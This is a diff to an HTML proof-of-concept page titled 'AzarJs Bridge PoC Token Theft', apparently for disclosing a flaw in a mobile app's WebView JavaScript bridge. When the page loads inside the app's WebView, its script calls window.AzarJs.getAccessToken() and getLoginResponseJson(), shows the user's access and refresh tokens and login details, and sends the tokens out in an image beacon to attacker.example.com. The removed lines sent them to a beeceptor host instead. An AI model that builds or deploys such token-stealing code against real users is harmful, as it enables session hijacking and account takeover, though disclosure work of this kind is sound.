@@ -1,6 +1,79 @@
+<!DOCTYPE html>
 <html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>AzarJs Bridge PoC</title>
+  <style>
+    body { font-family: monospace; background: #111; color: #0f0; padding: 16px; word-break: break-all; }
+    h2  { color: #f90; }
+    .box { background: #222; border: 1px solid #0f0; padding: 10px; margin: 10px 0; border-radius: 4px; font-size: 12px; }
+    .lbl { color: #0af; font-weight: bold; }
+    #status { color: #f55; font-size: 18px; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <h2>&#x26A0; AzarJs Bridge — PoC Token Theft</h2>
+  <div id="status">Waiting for AzarJs...</div>
+  <div id="out"></div>
+
 <script>
-var t = JSON.parse(window.AzarJs.getAccessToken());
-new Image().src = "https://evilios.free.beeceptor.com/c?a="+t.accessToken+"&r="+t.refreshToken;
+(function() {
+  var out = document.getElementById("out");
+  var status = document.getElementById("status");
+
+  function row(label, val) {
+    var d = document.createElement("div");
+    d.className = "box";
+    d.innerHTML = '<span class="lbl">' + label + '</span><br>' + val;
+    out.appendChild(d);
+  }
+
+  // Check bridge is present
+  if (typeof window.AzarJs === "undefined") {
+    status.textContent = "ERROR: AzarJs bridge not found (page not loaded inside Azar WebView)";
+    status.style.color = "#f00";
+    return;
+  }
+
+  status.textContent = "SUCCESS: AzarJs bridge FOUND — stealing tokens...";
+  status.style.color = "#0f0";
+
+  // 1. getAccessToken
+  try {
+    var tokenJson = window.AzarJs.getAccessToken();
+    var tokenObj  = JSON.parse(tokenJson);
+    row("getAccessToken() — accessToken (RS256 JWT)", tokenObj.accessToken || tokenJson);
+    if (tokenObj.refreshToken)
+      row("getAccessToken() — refreshToken (RS256 JWT)", tokenObj.refreshToken);
+  } catch(e) {
+    row("getAccessToken() error", e);
+  }
+
+  // 2. getLoginResponseJson
+  try {
+    var loginJson = window.AzarJs.getLoginResponseJson();
+    var login = JSON.parse(loginJson);
+    row("getLoginResponseJson() — userId", login.userId || "n/a");
+    if (login.userUniqueId)
+      row("getLoginResponseJson() — userUniqueId", login.userUniqueId);
+    if (login.stompBrokerInfo)
+      row("getLoginResponseJson() — stompBrokerInfo", JSON.stringify(login.stompBrokerInfo));
+    row("getLoginResponseJson() — full JSON (first 500 chars)", loginJson.substring(0, 500));
+  } catch(e) {
+    row("getLoginResponseJson() error", e);
+  }
+
+  // 3. Exfiltrate via image beacon (replace with actual C2 server)
+  try {
+    var tok = JSON.parse(window.AzarJs.getAccessToken());
+    new Image().src = "https://attacker.example.com/steal"
+      + "?a=" + encodeURIComponent(tok.accessToken)
+      + "&r=" + encodeURIComponent(tok.refreshToken || "");
+    row("Exfiltration beacon fired", "GET https://evilios.free.beeceptor.com/steal?a=<access_token>&r=<refresh_token>");
+  } catch(e) {}
+
+})();
 </script>
+</body>
 </html>
